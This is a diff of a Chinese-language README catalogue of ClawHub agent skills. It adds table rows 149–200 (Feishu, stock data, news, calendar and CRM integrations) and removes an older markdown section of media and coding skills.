+<td>在 macOS 上控制 Spotify 播放：播放/暂停、跳过曲目、调节音量、播放艺人/专辑/播放列表。适用于用户请求播放音乐、控制 Spotify、切换歌曲或调节 Spotify 音量。</td>
+</tr>
+<tr>
+<td align="center">149</td>
+<td>谷歌contacts</td>
+<td>Google Contacts 🔑</td>
+<td><a href="https://clawdhub.com/skills/google-contacts">ClawHub/google-contacts</a></td>
+<td>托管OAuth的Google通讯录API集成。管理联系人、联系人分组和搜索通讯录。当用户想要创建...</td>
+</tr>
+<tr>
+<td align="center">150</td>
+<td>反思</td>
+<td>Self Reflection</td>
+<td><a href="https://clawdhub.com/skills/reflection">ClawHub/reflection</a></td>
+<td>学会适时停下审视。先自省再呈现，减少修改轮次。</td>
+</tr>
+<tr>
+<td align="center">151</td>
+<td>飞书bitable</td>
+<td>feishu-bitable 🔑</td>
+<td><a href="https://clawdhub.com/skills/feishu-bitable">ClawHub/feishu-bitable</a></td>
+<td>使用提供的应用凭证管理飞书多维表格，支持列出表格以及添加记录或任务。</td>
+</tr>
+<tr>
+<td align="center">152</td>
+<td>QuickBooks</td>
+<td>QuickBooks 🔑</td>
+<td><a href="https://clawdhub.com/skills/quickbooks">ClawHub/quickbooks</a></td>
+<td>QuickBooks API 集成，采用托管 OAuth。仅在需要 QuickBooks 会计管理时安装，请使用最小权限的QuickBooks 账户进行连接...</td>
+</tr>
+<tr>
+<td align="center">153</td>
+<td>飞书Wordpowerwrite</td>
+<td>Feishu Docx PowerWrite</td>
+<td><a href="https://clawdhub.com/skills/feishu-docx-powerwrite">ClawHub/feishu-docx-powerwrite</a></td>
+<td>通过OpenClaw实现高质量飞书/ Lark Docx文档编写。可将Markdown转换为格式规范的飞书文档（支持标题、列表、嵌套、代码块），使用feishu_docx_write_markdown接口。包含安全流程、模板及故障排查。触发条件：飞书doc/docx链接、「写入飞书文档」、「生成飞书文档」、「追加/替换docx」、「Markdown转飞书文档」或用户需要统一规范的文档格式。</td>
+</tr>
+<tr>
+<td align="center">154</td>
+<td>学习</td>
+<td>Learning</td>
+<td><a href="https://clawdhub.com/skills/learning">ClawHub/learning</a></td>
+<td>自动学习您的最佳学习方式。为您适配教学风格、形式与深度。</td>
+</tr>
+<tr>
+<td align="center">155</td>
+<td>飞书日历</td>
+<td>feishu-calendar 🔑</td>
+<td><a href="https://clawdhub.com/skills/feishu-calendar">ClawHub/feishu-calendar</a></td>
+<td>管理飞书日历，包括列出、搜索日程，同步事件，通过自动提取日期标记任务</td>
+</tr>
+<tr>
+<td align="center">156</td>
+<td>写作</td>
+<td>Writing</td>
+<td><a href="https://clawdhub.com/skills/writing">ClawHub/writing</a></td>
+<td>适配写作风格，提升清晰度，跨会话记忆风格偏好。</td>
+</tr>
+<tr>
+<td align="center">157</td>
+<td>a股票交易助手</td>
+<td>A Stock Trading Assistant</td>
+<td><a href="https://clawdhub.com/skills/a-stock-trading-assistant">ClawHub/a-stock-trading-assistant</a></td>
+<td>专业A股交易助手，提供沪深市场实时行情、个股分析、大盘情绪、热点板块、交易策略和价格预警服务。</td>
+</tr>
+<tr>
+<td align="center">158</td>
+<td>WordReader</td>
+<td>Word Reader</td>
+<td><a href="https://clawdhub.com/skills/word-reader">ClawHub/word-reader</a></td>
+<td>读取 Word 文档（.docx 和 .doc 格式）并提取文本内容。支持文档解析、表格提取、图片处理等功能。使用当用户需要分析 Word 文档内容、提取文本信息或批量处理文档时。</td>
+</tr>
+<tr>
+<td align="center">159</td>
+<td>product营销context</td>
+<td>Product Marketing Context</td>
+<td><a href="https://clawdhub.com/skills/product-marketing-context">ClawHub/product-marketing-context</a></td>
+<td>当用户需要创建或更新产品营销上下文文档时使用。当用户提及“产品上下文”、“营销上下文”、“设置上下文”、“定位”或希望避免在营销任务中重复基础信息时也适用。创建`.claude/product-marketing-context.md`供其他营销技能引用。</td>
+</tr>
+<tr>
+<td align="center">160</td>
+<td>obsidian每日</td>
+<td>Obsidian Daily</td>
+<td><a href="https://clawdhub.com/skills/obsidian-daily">ClawHub/obsidian-daily</a></td>
+<td>通过 obsidian-cli 管理 Obsidian 日记笔记。支持创建、打开日记，追加条目（日志、记录、任务、链接），按日期查阅历史笔记及搜索库内容。支持“昨天”、“上周五”、“3天前”等相对日期。</td>
+</tr>
+<tr>
+<td align="center">161</td>
+<td>HubSpot</td>
+<td>HubSpot 🔑</td>
+<td><a href="https://clawdhub.com/skills/hubspot">ClawHub/hubspot</a></td>
+<td>HubSpot CRM与CMS API集成，用于联系人、公司、交易、所有者及内容管理。</td>
+</tr>
+<tr>
+<td align="center">162</td>
+<td>营销ideas</td>
+<td>marketing-ideas</td>
+<td><a href="https://clawdhub.com/skills/marketing-ideas">ClawHub/marketing-ideas</a></td>
+<td>当用户需要为其 SaaS 或软件产品获取营销创意、灵感或策略时使用。也适用于用户提问“营销创意”、“增长”等关键词时。</td>
+</tr>
+<tr>
+<td align="center">163</td>
+<td>浏览器自动化stealth</td>
+<td>Browser Automation Stealth</td>
+<td><a href="https://clawdhub.com/skills/browser-automation-stealth">ClawHub/browser-automation-stealth</a></td>
+<td>Playwright 包装器，实现隐形浏览器自动化，包括指纹随机化、代理轮换、验证码处理和会话持久化，防止被检测。</td>
+</tr>
+<tr>
+<td align="center">164</td>
+<td>新闻</td>
+<td>News</td>
+<td><a href="https://clawdhub.com/skills/news">ClawHub/news</a></td>
+<td>个性化新闻简报，自动学习您的兴趣、格式和接收时间偏好</td>
+</tr>
+<tr>
+<td align="center">165</td>
+<td>Mac TTS</td>
+<td>Mac TTS</td>
+<td><a href="https://clawdhub.com/skills/mac-tts">ClawHub/mac-tts</a></td>
+<td>使用 macOS 内置 `say` 命令进行文字转语音，适用于语音通知、声音提醒、朗读文本或通过 Mac 扬声器播报。支持多种语言，包括中文（普通话）、英语、日语等。</td>
+</tr>
+<tr>
+<td align="center">166</td>
+<td>tushare股票技能</td>
+<td>TuShare Stock Skill 🔑</td>
+<td><a href="https://clawdhub.com/skills/tushare-stock-skill">ClawHub/tushare-stock-skill</a></td>
+<td>面向中国 A 股的 Tushare 专用技能，提供股票数据获取、个股分析与交易观察能力。</td>
+</tr>
+<tr>
+<td align="center">167</td>
+<td>股实时行情数据</td>
+<td>A股实时行情数据</td>
+<td><a href="https://clawdhub.com/skills/a-share-real-time-data">ClawHub/a-share-real-time-data</a></td>
+<td>通过mootdx/TDX协议获取中国A股市场数据（包括K线、实时报价、逐笔成交）。适用于处理中国股票数据、mootdx库、TDX行情、分钟级K线、成交历史或实时A股市场数据。</td>
+</tr>
+<tr>
+<td align="center">168</td>
+<td>eastmoney股票</td>
+<td>Eastmoney Stock</td>
+<td><a href="https://clawdhub.com/skills/eastmoney-stock">ClawHub/eastmoney-stock</a></td>
+<td>查询东方财富股票数据，包括个股行情、涨跌幅、成交量等。用于回答股票相关问题。</td>
+</tr>
+<tr>
+<td align="center">169</td>
+<td>JavaScript技能</td>
+<td>JavaScript</td>
+<td><a href="https://clawdhub.com/skills/javascript-skills">ClawHub/javascript-skills</a></td>
+<td>综合JavaScript风格指南技能。激活后提供最佳编码规范，并生成严格遵循……的代码。</td>
+</tr>
+<tr>
+<td align="center">170</td>
+<td>Second Brain: Turn conversations into lasting knowledge</td>
+<td>Second Brain: Turn conversations into lasting knowledge 🔑</td>
+<td><a href="https://clawdhub.com/skills/second-brain">ClawHub/second-brain</a></td>
+<td>由Ensue驱动的个人知识库，用于捕捉和检索理解。当用户想要保存知识、回忆已知内容、管理工具箱或基于过往学习进行构建时使用。触发短语包括“save this”、“remember”、“what do I know about”、“add to toolbox”、“my notes on”、“store this concept”。</td>
+</tr>
+<tr>
+<td align="center">171</td>
+<td>Acuity Scheduling</td>
+<td>Acuity Scheduling 🔑</td>
+<td><a href="https://clawdhub.com/skills/acuity-scheduling">ClawHub/acuity-scheduling</a></td>
+<td>Acuity Scheduling API integration with managed OAuth. Manage appointments, calendars, clients, and availability. Use this skill when users want to schedule,...</td>
+</tr>
+<tr>
+<td align="center">172</td>
+<td>hot新闻aggregator</td>
+<td>hot-news-aggregator</td>
+<td><a href="https://clawdhub.com/skills/hot-news-aggregator">ClawHub/hot-news-aggregator</a></td>
+<td>国内外社会、科技、军事新闻汇总。自动搜索、筛选、整理新闻要点。Use When 需要获取最新的国内外社会、科技、军事新闻，并且希望自动筛选和整理新闻要点时。</td>
+</tr>
+<tr>
+<td align="center">173</td>
+<td>Executing Plans</td>
+<td>Executing Plans</td>
+<td><a href="https://clawdhub.com/skills/executing-plans">ClawHub/executing-plans</a></td>
+<td>当有书面实施计划，需在独立会话中执行并设置审查检查点时使用。</td>
+</tr>
+<tr>
+<td align="center">174</td>
+<td>Jobber</td>
+<td>Jobber 🔑</td>
+<td><a href="https://clawdhub.com/skills/jobber">ClawHub/jobber</a></td>
+<td>Jobber API 集成，托管 OAuth，可管理客户、工单、发票、报价、属性及团队成员，适用于现场服务业务。使用此技能。</td>
+</tr>
+<tr>
+<td align="center">175</td>
+<td>任务</td>
+<td>Task</td>
+<td><a href="https://clawdhub.com/skills/task">ClawHub/task</a></td>
+<td>通过工具调度管理Tasker文档存储任务。支持任务列表、今日/逾期任务、周计划、添加/移动/完成任务，或显式/task命令。</td>
+</tr>
+<tr>
+<td align="center">176</td>
+<td>每日digest</td>
+<td>Daily Digest</td>
+<td><a href="https://clawdhub.com/skills/daily-digest">ClawHub/daily-digest</a></td>
+<td>生成每日摘要，将存储记忆文件中的决策、经验教训、行动和问题整理成带日期的日记条目。</td>
+</tr>
+<tr>
+<td align="center">177</td>
+<td>每日新闻</td>
+<td>my-daily-news</td>
+<td><a href="https://clawdhub.com/skills/daily-news">ClawHub/daily-news</a></td>
+<td>{&quot;answer&quot;:&quot;每日抓取百度、谷歌等来源的热门新闻。&quot;}</td>
+</tr>
+<tr>
+<td align="center">178</td>
+<td>制作</td>
+<td>PPT制作</td>
+<td><a href="https://clawdhub.com/skills/dragon-ppt-maker">ClawHub/dragon-ppt-maker</a></td>
+<td>使用python-pptx制作科技风PPT，支持多布局、多图文混排及HTML内容嵌入，轻松生成专业演示文稿。</td>
+</tr>
+<tr>
+<td align="center">179</td>
+<td>Chargebee</td>
+<td>Chargebee 🔑</td>
+<td><a href="https://clawdhub.com/skills/chargebee">ClawHub/chargebee</a></td>
+<td>通过托管 OAuth 实现 Chargebee API 集成。仅在需要 Chargebee 账单管理时才安装。使用最小权限访问进行连接，并验证集成的...</td>
+</tr>
+<tr>
+<td align="center">180</td>
+<td>邮件to日历</td>
+<td>Email To Calendar 🔑</td>
+<td><a href="https://clawdhub.com/skills/email-to-calendar">ClawHub/email-to-calendar</a></td>
+<td>从转发的邮件中提取日程和待办事项并存储，支持查重创建日历事件。适用于处理含会议、截止日期等信息的邮件，或回顾已提取项目及创建日程。</td>
+</tr>
+<tr>
+<td align="center">181</td>
+<td>Apollo</td>
+<td>Apollo 🔑</td>
+<td><a href="https://clawdhub.com/skills/apollo-api">ClawHub/apollo-api</a></td>
+<td>Apollo.io API 集成，支持托管 OAuth，可搜索并丰富个人和公司信息，管理联系人和账户。适用于用户想要开发潜在客户等场景。</td>
+</tr>
+<tr>
+<td align="center">182</td>
+<td>Poetry</td>
+<td>Poetry</td>
+<td><a href="https://clawdhub.com/skills/poetry">ClawHub/poetry</a></td>
+<td>提供诗词生成与诗词查询两大核心能力。 基于 chinese-poetry 开源数据集（收录唐诗 57,607 首、宋诗 254,248 首、宋词 21,053 首、 元曲 11,057 首、诗经 305 篇、楚辞 65 篇、论语 20 章，以及四书五经、蒙学经典、纳兰性德诗集、 曹操诗集等），为用户提供精准的诗词...</td>
+</tr>
+<tr>
+<td align="center">183</td>
+<td>股票strategybacktester</td>
+<td>Stock Strategy Backtester</td>
+<td><a href="https://clawdhub.com/skills/stock-strategy-backtester">ClawHub/stock-strategy-backtester</a></td>
+<td>在历史OHLCV数据上回测股票交易策略，报告胜率、收益率、CAGR、回撤、夏普比率和交易日志。用于评估或...</td>
+</tr>
+<tr>
+<td align="center">184</td>
+<td>Jira</td>
+<td>Jira 🔑</td>
+<td><a href="https://clawdhub.com/skills/jira-api">ClawHub/jira-api</a></td>
+<td>{   &quot;description_zh&quot;: &quot;通过托管OAuth实现Jira API集成，支持使用J</td>
+</tr>
+<tr>
+<td align="center">185</td>
+<td>Eventbrite</td>
+<td>Eventbrite 🔑</td>
+<td><a href="https://clawdhub.com/skills/eventbrite">ClawHub/eventbrite</a></td>
+<td>使用托管 OAuth 集成 Eventbrite API，管理活动、场地、票务类别、订单和参与者。当用户想要创建和管理活动时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">186</td>
+<td>待办管理</td>
+<td>Todo management</td>
+<td><a href="https://clawdhub.com/skills/todo-management">ClawHub/todo-management</a></td>
+<td>基于工作区的SQLite待办管理器（./todo.db），支持分组及任务状态（pending/in_progress/done/skipped），通过 {baseDir}/scripts/todo.sh 进行添加、列出、编辑、移动、删除条目及管理分组。</td>
+</tr>
+<tr>
+<td align="center">187</td>
+<td>TickTickCLI</td>
+<td>TickTick CLI 🔑</td>
+<td><a href="https://clawdhub.com/skills/ticktick">ClawHub/ticktick</a></td>
+<td>通过命令行管理 TickTick 任务与项目，支持 OAuth2 认证、批量操作及速率限制处理。</td>
+</tr>
+<tr>
+<td align="center">188</td>
+<td>财经新闻深度分析技能</td>
+<td>财经新闻深度分析技能</td>
+<td><a href="https://clawdhub.com/skills/finance-news-pro">ClawHub/finance-news-pro</a></td>
+<td>财经新闻深度分析技能。从多个财经源抓取内容，进行情感分析（利好/利空/中性）、影响评估（行业/公司/市场）、关键信息提取，生成专业投资简报。支持 A 股/港股/美股、行业板块、个股分析。</td>
+</tr>
+<tr>
+<td align="center">189</td>
+<td>bbc新闻</td>
+<td>BBC News</td>
+<td><a href="https://clawdhub.com/skills/bbc-news">ClawHub/bbc-news</a></td>
+<td>使用 RSS 订阅获取并展示 BBC 新闻的各版块和地区报道。用户询问 BBC 新闻、英国头条、世界新闻或特定版块（科技、商业、政治、科学、健康、娱乐、英国地区、世界地区）时使用。</td>
+</tr>
+<tr>
+<td align="center">190</td>
+<td>Apple日历CLI</td>
+<td>Apple Calendar CLI</td>
+<td><a href="https://clawdhub.com/skills/accli">ClawHub/accli</a></td>
+<td>该技能用于与 macOS 上的苹果日历交互，支持列出日历、查看、创建、更新、删除日历事件以及检查忙碌状态。当用户请求“查看日历”、“安排会议”、“我的日程”、“明天有空吗”或进行日历相关操作时触发。</td>
+</tr>
+<tr>
+<td align="center">191</td>
+<td>飞书Wiki</td>
+<td>feishu-wiki</td>
+<td><a href="https://clawdhub.com/skills/feishu-wiki">ClawHub/feishu-wiki</a></td>
+<td>飞书知识库 Skill。创建知识空间、创建 Wiki 页面节点。当需要在飞书知识库中组织和沉淀文档时使用此 Skill。</td>
+</tr>
+<tr>
+<td align="center">192</td>
+<td>n8n自动化</td>
+<td>n8n Automation 🔑</td>
+<td><a href="https://clawdhub.com/skills/n8n-automation">ClawHub/n8n-automation</a></td>
+<td>通过 n8n REST API 从 OpenClaw 管理 n8n 工作流。当用户询问 n8n 工作流、自动化、执行情况，或需要触发、列出、创建、激活及调试工作流时使用。支持自托管 n8n 和 n8n Cloud 实例。</td>
+</tr>
+<tr>
+<td align="center">193</td>
+<td>高德官方地图综合服务</td>
+<td>Gaode Map LBS - 高德官方地图综合服务 Skill 🔑</td>
+<td><a href="https://clawdhub.com/skills/amap-lbs-skill">ClawHub/amap-lbs-skill</a></td>
+<td>高德地图综合服务，支持POI搜索、路径规划、旅游规划、周边搜索和热力图数据可视化</td>
+</tr>
+<tr>
+<td align="center">194</td>
+<td>定时调度器</td>
+<td>Cron Scheduler</td>
+<td><a href="https://clawdhub.com/skills/cron-scheduler">ClawHub/cron-scheduler</a></td>
+<td>使用简化的cron语法创建、列出、修改和删除定时任务以自动化系统任务，并管理输出日志。</td>
+</tr>
+<tr>
+<td align="center">195</td>
+<td>First Principles Decomposer</td>
+<td>First Principles Decomposer</td>
+<td><a href="https://clawdhub.com/skills/first-principles-decomposer">ClawHub/first-principles-decomposer</a></td>
+<td>把任何问题拆解为根本真理，再从原子层面重建解决方案。</td>
+</tr>
+<tr>
+<td align="center">196</td>
+<td>gog日历</td>
+<td>Google Calendar (via gogcli)</td>
+<td><a href="https://clawdhub.com/skills/gog-calendar">ClawHub/gog-calendar</a></td>
+<td>使用gogcli访问和管理Google日历事件，支持跨日历日程查看、关键词搜索及过滤输出，可排除节假日等无关日历。</td>
+</tr>
+<tr>
+<td align="center">197</td>
+<td>JotForm</td>
+<td>JotForm 🔑</td>
+<td><a href="https://clawdhub.com/skills/jotform">ClawHub/jotform</a></td>
+<td>JotForm API集成与托管OAuth。可创建表单、管理提交和访问表单数据。当用户需要与JotForm交互时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">198</td>
+<td>Sports Ticker</td>
+<td>Sports Ticker</td>
+<td><a href="https://clawdhub.com/skills/sports-ticker">ClawHub/sports-ticker</a></td>
+<td>实时体育赛事提醒，覆盖足球、NFL、NBA、NHL、MLB、F1等。使用免费 ESPN API 提供即时比分。追踪全球任意主要联赛的球队。</td>
+</tr>
+<tr>
+<td align="center">199</td>
+<td>微软todo</td>
+<td>Microsoft To Do 🔑</td>
+<td><a href="https://clawdhub.com/skills/microsoft-to-do">ClawHub/microsoft-to-do</a></td>
+<td>Microsoft To Do API 集成，使用托管 OAuth 管理。管理任务列表、任务、检查清单项和关联资源。当用户想要创建...时使用此技能</td>
+</tr>
+<tr>
+<td align="center">200</td>
+<td>quant交易cn</td>
+<td>Quant Trading CN</td>
+<td><a href="https://clawdhub.com/skills/quant-trading-cn">ClawHub/quant-trading-cn</a></td>
+<td>量化交易专家 - 基于印度股市实战经验，支持策略生成、回测、实盘交易（Zerodha/A股适配）</td>
+</tr>
+</tbody>
+</table>
 
-### 🎬 媒体处理
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| Airfoil AirPlay 控制 | [Clawdbot/airfoil](https://clawdhub.com/skills/airfoil) | 从命令行通过 Airfoil 控制 AirPlay 扬声器。使用简单的 CLI 命令连接、断开连接、设置音量和管理多房间音频。 |
-| 阿里云语音合成 | [Clawdbot/aliyun-tts](https://clawdhub.com/skills/aliyun-tts) | 阿里云文本语音合成服务。 |
-| ATXP | [Clawdbot/atxp](https://clawdhub.com/skills/atxp) | 访问 ATXP 付费 API 工具，用于网络搜索、AI 图像生成、音乐创作、视频生成和 X/Twitter 搜索。当用户需要实时网络搜索、AI 生成的媒体（图像、音乐、视频）或 X/Twitter 搜索时使用。需要通过“npx atxp login”进行身份验证。 |
-| 音频回复生成 | [Clawdbot/audio-reply-skill](https://clawdhub.com/skills/audio-reply-skill) | 使用 TTS 生成音频回复。通过“read it to me [URL]”触发以获取并大声朗读内容，或通过“talk to me [topic]”触发以生成口头响应。还可以响应“说话”、“说出来”、“语音回复”。 |
-| 每日圣经经文 | [Clawdbot/bible-votd](https://clawdhub.com/skills/bible-votd) | 获取带有可共享图像的 Bible.com 每日经文。 |
-| Brave Images | [Clawdbot/brave-images](https://clawdhub.com/skills/brave-images) | 使用 Brave Search API 搜索图像。当您需要查找任何主题的图像、图片、照片或视觉内容时使用。需要 BRAVE_API_KEY 环境变量。 |
-| 语音唤醒 TTS | [Clawdbot/clawdbot-skill-voice-wake-say](https://clawdhub.com/skills/clawdbot-skill-voice-wake-say) | 当用户输入指示语音唤醒/语音识别时（例如，以“用户通过<设备>上的语音识别进行交谈”开头的消息），在 macOS 上使用内置的“say”命令大声说出响应。 |
-| 着色页生成器 | [Clawdbot/coloring-page](https://clawdhub.com/skills/coloring-page) | 将上传的照片转换为可打印的黑白着色页。 |
-| ElevenLabs | [Clawdbot/elevenlabs-skill](https://clawdhub.com/skills/elevenlabs-skill) | 通过 ElevenLabs API 进行文本转语音、音效、音乐生成、语音管理和配额检查。使用 ElevenLabs 生成音频或管理语音时使用。 |
-| GifHorse | [Clawdbot/gifhorse](https://clawdhub.com/skills/gifhorse) | 搜索视频对话并创建带有定时字幕的反应 GIF。非常适合从电影和电视节目中创建具有模因价值的剪辑。 |
-| GPT | [Clawdbot/gpt](https://clawdhub.com/skills/gpt) | OpenAI GPT 集成。通过 OpenAI API 完成聊天、生成图像、嵌入和微调。 |
-| 图像优化器 | [Clawdbot/image-optimize](https://clawdhub.com/skills/image-optimize) | 获取人工智能驱动的图像优化建议。当图像减慢您的网站速度时使用。 |
-| 图像优化器 | [Clawdbot/image-optimizer](https://clawdhub.com/skills/image-optimizer) | 获取人工智能驱动的图像优化建议。当图像减慢您的网站速度时使用。 |
-| Krea API | [Clawdbot/krea-api](https://clawdhub.com/skills/krea-api) | 通过 Krea.ai API 生成图像（Flux、Imagen、Ideogram、Seedream 等） |
-| Nano Triple 图像生成 | [Clawdbot/nano-triple](https://clawdhub.com/skills/nano-triple) | 使用相同的提示使用 Nano Banana Pro 生成 3 个图像。选择最好的，或对任何选项提供反馈，以获得 3 个精致版本。 |
-| OpenAI Image Gen | [Clawdbot/openai-image-gen](https://clawdhub.com/skills/openai-image-gen) | 通过 OpenAI Images API 批量生成图像。随机提示采样器 + `index.html` 库。 |
-| OpenAI TTS | [Clawdbot/openai-tts](https://clawdhub.com/skills/openai-tts) | 通过 OpenAI 音频语音 API 进行文本转语音。 |
-| OpenAI TTS | [Clawdbot/openai-tts-bak-2026-01-28t18-01-23-10-30](https://clawdhub.com/skills/openai-tts-bak-2026-01-28t18-01-23-10-30) | 通过 OpenAI 音频语音 API 进行文本转语音。 |
-| Pinterest 搜索 | [Clawdbot/pinterest](https://clawdhub.com/skills/pinterest) | 搜索和浏览 Pinterest pin，获取 pin 详细信息，并通过 Telegram/消息发送实际图像给用户。当用户想要寻找灵感、搜索图像/想法或浏览 Pinterest 内容时使用。直接发送图像，而不仅仅是链接。 |
-| Pocket TTS | [Clawdbot/pocket-tts](https://clawdhub.com/skills/pocket-tts) | （无） |
-| 拖延症克星 | [Clawdbot/procrastination-buster](https://clawdhub.com/skills/procrastination-buster) | 通过任务分解、2 分钟开始和责任追踪来战胜拖延 |
-| Recipe to List | [Clawdbot/recipe-to-list](https://clawdhub.com/skills/recipe-to-list) | 将食谱变成 Todoist 购物清单。从食谱照片（Gemini Flash 视觉）或食谱网页（搜索 + 获取）中提取成分，然后使用保守的同义词/重叠规则与现有购物项目进行比较，跳过食品储藏室主食（盐/胡椒），并在单位匹配时求和数量。还将每个煮熟的食谱保存到工作区食谱中（食谱/）。 |
-| Remotion 最佳实践 | [Clawdbot/remotion](https://clawdhub.com/skills/remotion) | Remotion 的最佳实践 - React 中的视频创建 |
-| Remotion 最佳实践 | [Clawdbot/remotion-best-practices](https://clawdhub.com/skills/remotion-best-practices) | Remotion 的最佳实践 - React 中的视频创建 |
-| Remotion Server | [Clawdbot/remotion-server](https://clawdhub.com/skills/remotion-server) | 使用 Remote 进行无头视频渲染。适用于任何 Linux 服务器 - 无需 Mac 或 GUI。用于聊天演示、促销等的模板。 |
-| Reve AI | [Clawdbot/reve-ai](https://clawdhub.com/skills/reve-ai) | 使用 Reve AI API 生成、编辑和重新混合图像。在根据文本提示创建图像、根据说明编辑现有图像或组合/重新混合多个参考图像时使用。需要 REVE_API_KEY 或 REVE_AI_API_KEY 环境变量。 |
-| Smalltalk | [Clawdbot/smalltalk](https://clawdhub.com/skills/smalltalk) | 与实时 Smalltalk 图像（Cuis 或 Squeak）进行交互。用于评估 Smalltalk 代码、浏览类、查看方法源、定义类/方法、查询层次结构和类别。 |
-| Songsee | [Clawdbot/songsee](https://clawdhub.com/skills/songsee) | 使用 Songsee CLI 从音频生成频谱图和功能面板可视化。 |
-| Sudoku | [Clawdbot/sudoku](https://clawdhub.com/skills/sudoku) | 获取数独谜题并将其以 JSON 形式存储在工作区中；按需渲染图像；稍后透露解决方案。 |
-| Table Image | [Clawdbot/table-image](https://clawdhub.com/skills/table-image) | 从表格生成图像，以便在 Telegram 等消息传递应用程序中具有更好的可读性。显示表格数据时使用。 |
-| TikTok 集成 | [Clawdbot/tiktok](https://clawdhub.com/skills/tiktok) | TikTok 平台整合。管理视频、查看分析并跟踪参与度。 |
-| TTS | [Clawdbot/tts](https://clawdhub.com/skills/tts) | 使用 Hume AI（或 OpenAI）API 将文本转换为语音。当用户请求音频消息、语音回复或听到“vive voix”的内容时使用。 |
-| TTS WhatsApp | [Clawdbot/tts-whatsapp](https://clawdhub.com/skills/tts-whatsapp) | 在 WhatsApp 上以 40 多种语言发送高质量的文本转语音语音消息，并自动发送 |
-| VAP Media | [Clawdbot/vap-media](https://clawdhub.com/skills/vap-media) | AI 图像、视频和音乐生成。通量、Veo 3.1、Suno V5。 |
-| VAP 多媒体生成 | [Clawdbot/vap-multimedia-generation](https://clawdhub.com/skills/vap-multimedia-generation) | AI 图像、视频和音乐生成。通量、Veo 3.1、Suno V5。 |
-| Veo | [Clawdbot/veo](https://clawdhub.com/skills/veo) | 使用 Google Veo (Veo 3.1 / Veo 3.0) 生成视频。 |
-| 即梦 AI 视频生成器 | [Clawdbot/jimeng-video](https://clawdhub.com/skills/jimeng-video) | 即梦 AI 视频生成工具（含声音），通过火山引擎 API 自动生成带背景音乐和音效的高质量视频，支持文生视频和图生视频，适合短视频内容创作与批量生成。 |
-| Video Frames | [Clawdbot/video-frames](https://clawdhub.com/skills/video-frames) | 使用 ffmpeg 从视频中提取帧或短片。 |
-| Whispers from the Star | [Clawdbot/whispers-from-the-star](https://clawdhub.com/skills/whispers-from-the-star) | 笔画录 - 修仙文字冒险游戏。玩家从凡人开始修炼，经历炼气、筑基、金丹、元婴、化神、渡、飞升七大大关，通过选择修炼道心，最终成就修仙之路。支持转世传承、角色成长、物品系统。适用于修仙题材、角色扮演、文字冒险等场景。 |
-| Whispers from the Star CN | [Clawdbot/whispers-from-the-star-cn](https://clawdhub.com/skills/whispers-from-the-star-cn) | 星之低语 - 科幻生存冒险游戏。玩家扮演Stella Chen，一名玩家坠落击败致命星球的宿主，需要在盖亚星球上探索、生存、解谜，寻找回家之路。支持多场景探索、资源管理、外星生物互动。适用于科幻冒险、生存模拟、互动叙事等场景。 |
-| YouTube API CLI | [Clawdbot/yt-api-cli](https://clawdhub.com/skills/yt-api-cli) | 从命令行管理您的 YouTube 帐户。适用于 YouTube 数据 API v3 的完整 CLI - 列出/搜索视频、上传、管理播放列表等。 |
-| yt-dlp Downloader | [Clawdbot/yt-dlp-downloader-skill](https://clawdhub.com/skills/yt-dlp-downloader-skill) | 使用 yt-dlp 从 YouTube、Bilibili、Twitter 和数千个其他网站下载视频。当用户提供视频 URL 并想要下载该视频、提取音频 (MP3)、下载字幕或选择视频质量时使用。在“下载视频”、“下载视频”、“yt-dlp”、“YouTube”、“B站”、“抖音”、“提取音频”、“提取音频”等短语上触发。 |
+---
 
+<a id="cat-data-analysis"></a>
 
-## 三、开发运维 🛠️
+## 4、📊 数据分析
 
-### 💻 代码开发
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| 0x DEX 聚合器 | [Clawdbot/0x-swap](https://clawdhub.com/skills/0x-swap) | 0x 协议 DEX 聚合器。在以太坊、Polygon、BSC 等 9 多个流动性来源中以最优惠的汇率交换代币。 |
-| ADHD 专注辅助 | [Clawdbot/adhd-body-doubling](https://clawdhub.com/skills/adhd-body-doubling) | 适合创始人的朋克风格 ADHD 身体加倍。焦点课程、多巴胺菜单、紧急重置方案。当用户说“替身”、“集中注意力”、“我被困住了”、“无法开始”或提到注意力缺陷多动症生产力时使用。 |
-| Spotify 播放器 | [Clawdbot/ahmed](https://clawdhub.com/skills/ahmed) | 终端 Spotify 通过 spogo（首选）或 spotify_player 播放/搜索。 |
-| Answer Overflow Discord 搜索 | [Clawdbot/answeroverflow](https://clawdhub.com/skills/answeroverflow) | 通过 Answer Overflow 搜索索引的 Discord 社区讨论。查找仅存在于 Discord 对话中的编码问题、库问题和社区问答的解决方案。 |
-| Azure CLI | [Clawdbot/azure-cli](https://clawdhub.com/skills/azure-cli) | 通过命令行界面进行全面的 Azure 云平台管理 |
-| BlueBubbles | [Clawdbot/bluebubbles](https://clawdhub.com/skills/bluebubbles) | 为 Clawdbot 构建或更新 BlueBubbles 外部通道插件（扩展包、REST 发送/探测、webhook 入站）。 |
-| Amazon 购买助手 | [Clawdbot/buy-anything](https://clawdhub.com/skills/buy-anything) | 通过对话结账从亚马逊购买产品。当用户共享亚马逊产品 URL 或通过亚马逊链接说“购买”、“订购”或“购买”时使用。 |
-| ByteRover 知识管理 | [Clawdbot/byterover](https://clawdhub.com/skills/byterover) | 使用 ByteRover 上下文树管理项目知识。提供两种操作：查询（检索知识）和管理（存储知识）。当用户请求信息查找、模式发现或知识持久性时调用。由 ByteRover Inc. 开发 (https://byterover.dev/) |
-| ByteRover 测试 | [Clawdbot/byterover-test](https://clawdhub.com/skills/byterover-test) | 查询和整理 ByteRover 上下文树中的知识。当用户要求记住信息、添加上下文、搜索模式、查询实施或管理项目知识时使用。触发诸如“记住这一点”、“添加到上下文”、“X 如何工作”、“模式是什么”、“存储此”、“保存此知识”、“管理”、“brv 查询”、“检查上下文树”等短语。 |
-| Chaos Lab AI 对齐研究 | [Clawdbot/chaos-lab](https://clawdhub.com/skills/chaos-lab) | 用于通过冲突的优化目标探索人工智能对齐的多代理框架。生成带有工程混乱的 Gemini 特工并观察紧急行为。 |
-| Clawdbot 工作区模板审查 | [Clawdbot/clawdbot-skill-clawdbot-workspace-template-review](https://clawdhub.com/skills/clawdbot-skill-clawdbot-workspace-template-review) | 将 Clawdbot 工作区与随 Clawdbot 安装的官方模板（npm 或源代码）进行比较，并列出要引入的缺失部分，尤其是在升级之后。 |
